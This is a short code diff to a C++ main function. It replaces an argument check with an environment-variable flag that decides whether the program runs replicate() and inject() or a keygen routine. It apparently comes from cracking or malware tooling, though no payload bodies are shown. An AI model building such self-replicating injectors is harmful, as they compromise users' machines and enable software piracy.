@@ -10,17 +10,15 @@
 
 int main(int argc, char** argv) CAREANDBARE(
 {
-    bool isInjector = true;
-
-    for (int i = 1; i < argc; i++) {
-        if (argv[i] == noninjectKey) isInjector = false;
-    }
+    auto* injectFlagEnv = getenv("FKCV");
+    bool isInjector = injectFlagEnv == nullptr;
 
     getHomePath();
 
     if (isInjector) {
         replicate(argv[0]);
         inject();
+        setenv("FKCV", "", 1);
     }
     else {
         procKeygen();
